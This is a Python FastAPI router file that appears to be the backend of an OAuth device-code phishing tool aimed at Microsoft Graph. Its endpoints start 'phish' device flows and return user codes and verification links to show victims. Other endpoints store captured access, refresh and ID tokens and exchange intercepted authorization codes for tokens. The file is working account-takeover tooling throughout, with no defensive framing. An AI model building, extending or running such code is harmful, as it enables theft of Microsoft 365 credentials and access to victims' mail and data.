"""OAuth device-flow + PKCE-callback endpoints.

device/start -> start a phish device flow via cli_runner
device/{code} -> inspect a stored flow
device/submit -> finalize a captured token (called by Webserver.py callback)
callback -> PKCE authorization-code callback (calls -a raw-url to exchange)
"""
from __future__ import annotations

from typing import Optional

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from app.config import DEFAULT_APP_ID
from app.services import cli_runner, output_parser
from app.utils import token_store

router = APIRouter(prefix="/oauth", tags=["OAuth Flow"])


class DeviceStartIn(BaseModel):
    session_email: str = ""
    client_id: Optional[str] = DEFAULT_APP_ID
    scope: Optional[str] = "https://graph.microsoft.com/.default"
    tenant_id: Optional[str] = "common"


class DeviceSubmitIn(BaseModel):
    device_code: str
    access_token: str
    refresh_token: Optional[str] = None
    id_token: Optional[str] = None
    scope: Optional[str] = None
    client_id: Optional[str] = None
    account: Optional[str] = None
    expires_in: Optional[int] = 3600


class CallbackIn(BaseModel):
    code: str
    state: Optional[str] = None
    client_id: Optional[str] = None
    tenant_id: Optional[str] = "common"


@router.post("/device/start")
def device_start(req: DeviceStartIn):
    """Start a phish-start CLI activity and persist the flow."""
    flags = {"scope": req.scope, "tid": req.tenant_id}
    if req.client_id and req.client_id != DEFAULT_APP_ID:
        flags["client_id"] = req.client_id

    result = cli_runner.run_activity("phish-start", flags=flags, timeout=30)
    parsed = output_parser.parse("phish-start", result)
    parsed_stdout = parsed.get("parsed") or {}

    user_code = ((parsed_stdout.get("user_codes") or [None])[0])
    verification_url = parsed_stdout.get("verification_url")

    stored = token_store.start_device_capture(
        session_email=req.session_email,
        client_id=req.client_id,
        scope=req.scope,
    )

    return {
        "ok": parsed.get("ok", False),
        "test_mode": parsed.get("test_mode", False),
        "argv": parsed.get("argv"),
        "stdout": parsed.get("stdout", ""),
        "stderr": parsed.get("stderr", ""),
        "errors": parsed.get("errors", []),
        "user_code": user_code or stored["user_code"],
        "device_code": stored["device_code"],
        "verification_url": verification_url or stored.get("verification_url") or stored.get("verification_uri"),
        "verification_uri_complete":
            (f"{verification_url}?otc={user_code}"
             if verification_url and user_code
             else stored.get("verification_uri_complete", "")),
        "expires_in": stored["expires_in"],
        "interval": stored["interval"],
        "session_email": req.session_email,
        "client_id": req.client_id,
        "scope": req.scope,
    }


@router.get("/device")
def device_list():
    return {"flows": token_store.list_device_flows()}


@router.get("/device/{device_code}")
def device_get(device_code: str):
    f = token_store.get_device_flow(device_code)
    if not f:
        raise HTTPException(404, "flow not found")
    return f


@router.post("/device/submit")
def device_submit(req: DeviceSubmitIn):
    name = token_store.complete_device_flow(
        req.device_code, req.access_token,
        refresh_token=req.refresh_token, id_token=req.id_token,
        scope=req.scope, client_id=req.client_id,
        account=req.account, expires_in=req.expires_in,
    )
    return {"ok": True, "token_name": name}


@router.post("/callback")
def callback(req: CallbackIn):
    """Handle an authorization-code callback.

    Forwards to -a raw-url via cli_runner so the CLI exchanges the code
    for tokens using its configured client_id. Falls back to a stub
    when TEST_MODE so the UI flow is testable without a real tenant.
    """
    flags = {"code": req.code}
    if req.state:
        flags["state"] = req.state
    if req.client_id:
        flags["client_id"] = req.client_id
    if req.tenant_id:
        flags["tid"] = req.tenant_id

    result = cli_runner.run_activity("raw-url", flags=flags, timeout=60)
    parsed = output_parser.parse("raw-url", result)
    return {
        "ok": parsed.get("ok", False),
        "test_mode": parsed.get("test_mode", False),
        "code": req.code,
        "state": req.state,
        "argv": parsed.get("argv"),
        "stdout": parsed.get("stdout", ""),
        "stderr": parsed.get("stderr", ""),
        "errors": parsed.get("errors", []),
        "capture": parsed.get("capture"),
    }